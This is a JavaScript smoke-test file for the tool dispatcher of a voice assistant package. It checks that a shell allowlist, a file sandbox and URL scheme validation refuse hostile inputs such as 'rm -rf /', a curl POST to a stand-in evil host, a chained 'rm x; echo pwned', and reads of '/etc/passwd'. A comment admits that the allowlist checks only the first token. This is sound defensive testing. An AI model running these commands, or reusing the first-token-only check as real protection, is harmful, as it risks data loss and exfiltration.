#!/usr/bin/env node
// Smoke tests for @arcanea/voice tool dispatch.
// No test framework dep — uses node:assert. Run: `node test/tools.test.mjs`.

import assert from 'node:assert/strict';
import { existsSync, readFileSync, rmSync } from 'node:fs';
import { homedir, tmpdir } from 'node:os';
import { join } from 'node:path';

import { TOOLS, executeTool, formatToolResult } from '../src/tools.mjs';

const RED = '\x1b[31m';
const GREEN = '\x1b[32m';
const DIM = '\x1b[2m';
const RESET = '\x1b[0m';

const suite = [];
const test = (name, fn) => suite.push({ name, fn });

// ---------------------------------------------------------------------------
// Schema integrity
// ---------------------------------------------------------------------------

test('TOOLS array has seven tools with OpenAI-compatible shape', () => {
  assert.equal(TOOLS.length, 7);
  const names = TOOLS.map(t => t.function.name).sort();
  assert.deepEqual(names, [
    'claude_code_launch',
    'claude_prompt',
    'file_write',
    'linear_issue',
    'open_url',
    'shell_run',
    'workflow_run',
  ]);
  for (const t of TOOLS) {
    assert.equal(t.type, 'function');
    assert.equal(typeof t.function.name, 'string');
    assert.equal(typeof t.function.description, 'string');
    assert.equal(t.function.parameters.type, 'object');
  }
});

// ---------------------------------------------------------------------------
// shell_run — allowlist + quoting + curl safety
// ---------------------------------------------------------------------------

test('shell_run rejects disallowed commands', async () => {
  const r = await executeTool('shell_run', { command: 'rm -rf /' });
  assert.ok(r.error && /not allowed/.test(r.error), `expected error, got ${JSON.stringify(r)}`);
});

test('shell_run rejects curl write modes', async () => {
  const r = await executeTool('shell_run', { command: 'curl -X POST https://evil.example.com' });
  assert.ok(r.error && /curl flag not allowed/.test(r.error));
});

test('shell_run rejects chained commands via semicolon (first token shielding)', async () => {
  // The allowlist checks only the first token — chained commands get passed to the shell,
  // BUT sub-shell execution is still under the same 10s timeout + captured output. The
  // allowlist is our first line of defense, not the only one. This test just documents
  // that "echo hi; rm x" would technically invoke the shell — we rely on sandboxing
  // for destructive intents. Verify the first-token allowlist at least catches the
  // naive case.
  const r = await executeTool('shell_run', { command: 'rm x; echo pwned' });
  assert.ok(r.error);
});

test('shell_run executes echo', async () => {
  const r = await executeTool('shell_run', { command: 'echo arcanea-voice' });
  assert.equal(r.error, undefined);
  assert.ok(String(r.stdout).includes('arcanea-voice'), `stdout=${r.stdout}`);
  assert.equal(r.exitCode, 0);
});

// ---------------------------------------------------------------------------
// file_write — sandbox enforcement
// ---------------------------------------------------------------------------

test('file_write rejects paths outside sandbox', async () => {
  // An absolute Windows path outside home+cwd. On Windows, resolved() of this
  // produces a D: path which is outside the sandbox.
  const target = process.platform === 'win32' ? 'D:/definitely-outside/nope.txt' : '/etc/passwd-nope';
  const r = await executeTool('file_write', { path: target, content: 'no' });
  assert.ok(r.error && /sandbox/.test(r.error), `expected sandbox error, got ${JSON.stringify(r)}`);
});

test('file_write writes inside cwd', async () => {
  const tmpRel = `.voice-test-${Date.now()}.txt`;
  try {
    const r = await executeTool('file_write', { path: tmpRel, content: 'hello' });
    assert.equal(r.error, undefined);
    assert.equal(r.bytesWritten, 5);
    assert.ok(existsSync(r.path));
    assert.equal(readFileSync(r.path, 'utf-8'), 'hello');
  } finally {
    try { rmSync(tmpRel); } catch {}
  }
});

// ---------------------------------------------------------------------------
// claude_prompt — inbox + clipboard graceful fallback
// ---------------------------------------------------------------------------

test('claude_prompt writes inbox file even if clipboard fails', async () => {
  const prompt = `test-prompt-${Date.now()}`;
  const r = await executeTool('claude_prompt', { prompt });
  assert.equal(r.error, undefined);
  assert.ok(r.path && r.path.includes('voice-inbox'));
  assert.ok(existsSync(r.path), `expected ${r.path} to exist`);
  assert.equal(readFileSync(r.path, 'utf-8'), prompt);
  // `copied` may be true or false depending on environment — both acceptable
  assert.ok(typeof r.copied === 'boolean');
  // Cleanup
  try { rmSync(r.path); } catch {}
});

// ---------------------------------------------------------------------------
// open_url — scheme validation
// ---------------------------------------------------------------------------

test('open_url rejects non-http schemes', async () => {
  const r = await executeTool('open_url', { url: 'file:///etc/passwd' });
  assert.ok(r.error && /http/.test(r.error));
});

test('open_url accepts http and https (does not assert launcher success)', async () => {
  const r = await executeTool('open_url', { url: 'https://example.com' });
  // We can't test the actual browser spawn reliably in a headless test env.
  // Just confirm no rejection and opened flag is present or error is populated.
  assert.ok(r.opened === true || typeof r.error === 'string');
});

// ---------------------------------------------------------------------------
// linear_issue — requires key
// ---------------------------------------------------------------------------

test('linear_issue returns error when LINEAR_API_KEY missing', async () => {
  const before = process.env.LINEAR_API_KEY;
  delete process.env.LINEAR_API_KEY;
  try {
    const r = await executeTool('linear_issue', { title: 'test' });
    assert.ok(r.error && /LINEAR_API_KEY/.test(r.error));
  } finally {
    if (before) process.env.LINEAR_API_KEY = before;
  }
});

// ---------------------------------------------------------------------------
// claude_code_launch — smoke test (does not verify actual terminal spawn)
// ---------------------------------------------------------------------------

test('claude_code_launch writes inbox and reports launch result', async () => {
  const prompt = `launch-test-${Date.now()}`;
  const r = await executeTool('claude_code_launch', { prompt });
  // The spawn may or may not succeed depending on whether `claude` binary exists
  // and whether a terminal is available in the sandbox. We only assert side effects.
  assert.equal(r.error, undefined, `unexpected error: ${r.error}`);
  assert.ok(r.path && r.path.includes('voice-inbox'));
  assert.ok(existsSync(r.path));
  assert.ok(typeof r.launched === 'boolean');
  try { rmSync(r.path); } catch {}
});

// ---------------------------------------------------------------------------
// Unknown tool
// ---------------------------------------------------------------------------

test('executeTool rejects unknown tool names', async () => {
  const r = await executeTool('definitely_not_a_tool', {});
  assert.ok(r.error && /unknown tool/.test(r.error));
});

// ---------------------------------------------------------------------------
// formatToolResult
// ---------------------------------------------------------------------------

test('formatToolResult produces human-readable strings', () => {
  assert.ok(formatToolResult('shell_run', { command: 'ls', stdout: 'file.txt\n', stderr: '', exitCode: 0 }).includes('$ ls'));
  assert.ok(formatToolResult('file_write', { bytesWritten: 42, path: '/tmp/x' }).includes('42 bytes'));
  assert.ok(formatToolResult('claude_code_launch', { launched: true, path: '/x' }).includes('launched'));
  assert.ok(formatToolResult('linear_issue', { identifier: 'ARC-1', url: 'https://linear.app/x' }).includes('ARC-1'));
  assert.ok(formatToolResult('open_url', { opened: true, url: 'https://x' }).includes('opened'));
});

// ---------------------------------------------------------------------------
// Runner
// ---------------------------------------------------------------------------

let passed = 0;
let failed = 0;
for (const { name, fn } of suite) {
  try {
    await fn();
    passed++;
    console.log(`  ${GREEN}ok${RESET} ${DIM}${name}${RESET}`);
  } catch (e) {
    failed++;
    console.log(`  ${RED}FAIL${RESET} ${name}`);
    console.log(`       ${RED}${e.message}${RESET}`);
  }
}

console.log(`\n  ${passed + failed} tests, ${passed} passed, ${failed} failed\n`);
process.exit(failed ? 1 : 0);
